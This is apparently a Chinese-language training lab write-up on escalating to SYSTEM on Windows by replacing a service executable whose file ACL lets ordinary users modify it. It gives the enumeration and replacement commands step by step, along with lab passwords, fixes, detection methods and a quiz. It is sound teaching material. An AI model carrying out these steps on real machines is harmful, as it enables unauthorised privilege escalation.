# Day 17：Service 本身不能改，但它執行的 EXE 可以改呢？

## 開場情境

昨天你學會了：如果你能 `sc config` 修改 Service 的 binPath，你就能控制 SYSTEM 執行什麼。

但今天的情境不同。你嘗試 `sc config`——

```
[SC] OpenService 無法 5:
存取被拒。
```

IT 團隊修好了 Service ACL。你不能再修改 Service 設定了。

但等一下。Service 設定只是第一層保護。SCM 最終啟動的是 **binPath 指向的那個 exe 檔案**。那個檔案本身呢？

---

## 今天要解決的問題

1. Service Object ACL 和 Binary File ACL 有什麼不同？
2. 為什麼兩層都要保護？
3. 「Service 設定不能改」就代表安全嗎？
4. W01 和 W02 到底差在哪？

---

## 背景知識：Windows Service 的兩層安全模型

### 第一層：Service Object ACL（SCM 層級）

控制的是：**誰能修改 Service 的設定**（binPath、帳號、啟動方式等）

查詢方式：`sc sdshow <service>`

這就是 Day 16 (W01) 教的。

### 第二層：Binary File ACL（NTFS 層級）

![Service Binary File ACL](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day17-service-binary-diagram-01.png)


控制的是：**誰能修改 Service 實際執行的 .exe 檔案**

查詢方式：`icacls <exe path>`

這是今天 (W02) 要教的。


### 為什麼兩層都必須安全？

| 只修 Service ACL | 只修 Binary ACL | 兩層都修 |
|:---:|:---:|:---:|
| W01 blocked | W02 仍可能 | ✅ 安全 |
| 攻擊者不能 sc config | 攻擊者可以替換 exe | 兩條路都封死 |

---

## OS 原理：SCM 如何啟動 Service

```
1. SCM 讀取 Registry 中的 ImagePath
2. SCM 開啟該路徑的檔案
3. SCM 建立 Process（以 Service Account 身分）
4. SCM 等待 Process 回報 SERVICE_RUNNING
```

注意第 2 步：**SCM 不會驗證 exe 的 hash、簽章或完整性**。它只是啟動 Registry 裡記錄的路徑。

所以如果攻擊者能替換那個 exe，SCM 下次啟動時就會執行攻擊者的程式。

---

## FEI Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
OS: Windows 10 Pro (Build 19045)
起始帳號: fei-student (Standard User)
目標: SYSTEM
Scenario: FEI-W02-SERVICE-BINARY
Service: FEITrainingBinaryService (LocalSystem)
Flag: C:\FEI-PrivEsc\Flags\fei-w02-system-flag.txt
```



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W02-SERVICE-BINARY

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W02-SERVICE-BINARY STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

### 部署過程

1. 用 `csc.exe` 編譯合法 Service exe + payload helper
2. 建立 `FEITrainingBinaryService`（LocalSystem）
3. **Service ACL 安全**：BU 有 START/STOP 但**沒有 CHANGE_CONFIG**
4. **Binary ACL 弱**：Users 有 **Modify** 權限
5. Payload helper 放在 tools/ 目錄

---

## 如果我是攻擊者，我現在想知道什麼？

### 嘗試 W01 的方法

```cmd
sc config FEITrainingBinaryService binPath= "test"
```

```
[SC] OpenService 無法 5:
存取被拒。
```

> W01 的路不通了。Service ACL 修好了。

### 那 exe 本身呢？

```cmd
sc qc FEITrainingBinaryService
```

找到 `BINARY_PATH_NAME`，然後：

```cmd
icacls "C:\FEI-PrivEsc\Training\W02\FEITrainingBinaryService.exe"
```

```
C:\FEI-PrivEsc\Training\W02\FEITrainingBinaryService.exe
    NT AUTHORITY\SYSTEM:(F)
    BUILTIN\Administrators:(F)
    BUILTIN\Users:(M)
```

> **Users:(M)** — Modify 權限！fei-student 可以修改（替換）這個 exe。

### 直接讀 Flag？

```cmd
type "C:\FEI-PrivEsc\Flags\fei-w02-system-flag.txt"
```

```
存取被拒。
```

---

## Attack Reasoning

![Service Binary Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day17-service-binary-diagram-02.png)



---

## 實際攻擊流程（Actual Output）

### Step 1：停止 Service

```cmd
sc stop FEITrainingBinaryService
```

### Step 2：備份並替換 binary

```cmd
move "C:\FEI-PrivEsc\Training\W02\FEITrainingBinaryService.exe" "C:\FEI-PrivEsc\Training\W02\FEITrainingBinaryService.exe.bak"
copy "C:\FEI-PrivEsc\Training\W02\tools\fei-payload-helper.exe" "C:\FEI-PrivEsc\Training\W02\FEITrainingBinaryService.exe"
```

### Step 3：啟動 Service

```cmd
sc start FEITrainingBinaryService
```

Service 啟動後，SYSTEM 執行了我們的 payload helper，它將 Flag 複製到了公開位置。

### Step 4：讀取 Flag

```cmd
type C:\Users\Public\fei-w02-proof.txt
```

```
========================================
 FEI PrivEsc Lab — SYSTEM Proof
========================================
Executed as: SYSTEM
Flag: FEI{WINDOWS_W02_SYSTEM_ACCESS}
```

---

## Attack Path

![Service Binary Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day17-service-binary-diagram-03.png)



---

## 為什麼它真的成立？

W01 的信任鏈是：

```
SCM 信任 binPath 設定 → binPath 可被修改 → 攻擊者控制 SYSTEM 執行什麼
```

W02 的信任鏈不同：

```
SCM 信任 binPath 指向的檔案 → 檔案可被替換 → 攻擊者控制 SYSTEM 執行什麼
```

兩者的終點一樣（SYSTEM 執行攻擊者的程式），但攻擊面不同：

| | W01 | W02 |
|---|---|---|
| 弱點位置 | Service Object ACL | NTFS File ACL |
| 攻擊動作 | `sc config binPath=` | `copy payload.exe → service.exe` |
| 檢查指令 | `sc sdshow` | `icacls` |

---

## False Positive 分析

### 「Binary 可寫」就一定危險嗎？

不一定。需要同時滿足：

1. Binary 屬於一個 **Service**（或其他高權限自動執行機制）
2. 該 Service 以 **高權限** 執行（LocalSystem / Administrator）
3. 攻擊者可以 **觸發** Service 重新啟動

如果一個 exe 可寫，但它只是使用者自己手動執行的工具、沒有 Service 綁定，那就不是提權向量。

### 常見 False Positive 場景

| 情況 | 是否危險？ | 原因 |
|------|-----------|------|
| Users 可寫的 exe，Service 以 SYSTEM 執行 | ✅ 危險 | 標準 W02 |
| Users 可寫的 exe，Service 以 LocalService 執行 | ⚠️ 有限 | LocalService 權限有限 |
| Users 可寫的 exe，但沒有對應 Service | ❌ | 不是自動執行 |
| Users 可寫的 exe，Service 在，但 student 不能 start/stop | ⚠️ | 需等 reboot 或 failure recovery |

---

## Edge Case

### 檔案正在使用中

如果 Service 正在執行，exe 通常被鎖定。你需要先 `sc stop`，才能替換。

如果你**沒有** SERVICE_STOP 權限呢？你需要等到：
- 系統重開機
- Service crash 後自動重啟
- 管理員手動重啟

### DLL Hijacking 的交叉

如果你不能替換 exe，但可以在 exe 同目錄放一個 DLL 呢？那就是 **Day 24 (W09)** 的主題。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| `move` 失敗 | exe 正在使用中 | 先 `sc stop` |
| `copy` 成功但 Service 啟動失敗 | payload 不是有效 Service exe | 用 Lab 提供的 payload helper |
| Flag 沒出現 | payload 寫入位置的 ACL 不允許 | 改用 `C:\Users\Public\` |
| Service 啟動後立即停止 | payload 執行完就結束 | 這是預期的，proof 已經寫了 |

---

## 防禦（Defense）

### Root Cause

Service exe 的 NTFS ACL 授予了 `Users` Modify 權限。

### 修復

```cmd
icacls "C:\path\to\service.exe" /remove Users
icacls "C:\path\to\service.exe" /grant:r "SYSTEM:(F)" "Administrators:(F)"
```

### 企業防禦

| 措施 | 說明 |
|------|------|
| 安裝路徑 | Service exe 應在 `Program Files`（預設 ACL 安全）|
| ACL 審計 | 定期掃描 Service binary 的 NTFS ACL |
| Code Signing | 配合 AppLocker/WDAC 只允許簽章的 binary |
| Event Log | 監控 Service binary 被修改（File Audit） |

---

## Detection（偵測）

| 偵測點 | 方法 |
|--------|------|
| Service binary 被修改 | File Integrity Monitoring (FIM) |
| 非預期的 Service 重啟 | Event ID 7036 |
| Service binary hash 變更 | 定期比對 baseline hash |
| Process Creation | Event ID 4688，看新 Service process 的 hash |

---

## Fix Verification

修復後驗證：

```cmd
icacls "C:\path\to\service.exe"
```

確認 Users 只有 `(RX)` 或完全不在列表中。

然後嘗試：

```cmd
copy /Y "C:\temp\test.exe" "C:\path\to\service.exe"
```

應回傳「存取被拒」。

---

## Exercise

### 練習 1：兩層判斷

你發現一個 Service `MySvc`：
- `sc sdshow` 顯示 BU 沒有 DC（Service ACL 安全）
- `icacls MySvc.exe` 顯示 `Users:(RX)`（Binary ACL 也安全）

但 `icacls C:\path\to\MySvc\` 顯示目錄 `Users:(F)`。這有風險嗎？

### 解答如果目錄有 FullControl，Users 可以刪除 exe 再建立同名檔案（即使 exe 本身不可寫）。有些 Windows 版本的 NTFS 行為允許這個操作。所以是的，目錄 ACL 也需要安全。

### 練習 2：如何在沒有 accesschk 的情況下檢查所有 Service binary ACL？

### 解答

```powershell
Get-WmiObject win32_service | Where-Object { $_.StartName -eq "LocalSystem" } | ForEach-Object {
    $path = $_.PathName -replace '"',''
    Write-Output "$($_.Name): $path"
    icacls $path 2>$null | Select-String "Users|Everyone"
}
```


---

## Quiz

**Q1**: W01 和 W02 的核心差異是什麼？

A. W01 以 SYSTEM 執行，W02 以 Administrator 執行
B. W01 修改 Service 設定，W02 修改 Service binary
C. W01 需要 Administrators 權限，W02 不需要
D. W01 比 W02 更危險

### 答案B。W01 的弱點在 Service Object ACL（sc config），W02 的弱點在 NTFS File ACL（替換 exe）。

**Q2**: 為什麼替換 exe 前需要先 `sc stop`？

A. 因為需要 admin 權限
B. 因為 Windows 不允許替換執行中的檔案
C. 因為 sc start 需要先 stop
D. 因為 ACL 在 Service 運行時會改變

### 答案B。Windows 會鎖定正在執行的檔案（File Lock），你需要先停止 Service 讓 exe 被釋放，才能替換。



## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W02-SERVICE-BINARY
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W02-SERVICE-BINARY STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Service 有兩層保護**：Service Object ACL（SCM）和 Binary File ACL（NTFS）。兩層都必須安全。
2. **「Service 設定不能改」不代表安全**。如果 exe 本身可以被替換，效果一樣。
3. **檢查 Service 安全性需要同時用 `sc sdshow` 和 `icacls`**。只看一個會遺漏另一個。

---

## 給自己的問題

> 如果 Service ACL 安全（W01 blocked），Binary ACL 也安全（W02 blocked），但 Service 的 ImagePath **含有空格且沒有引號**呢？

Windows 的路徑解析會不會「看到」一個你可以控制的位置？

---

## 下一篇

Day 18：Unquoted Service Path — Windows 到底會先執行哪個 EXE？
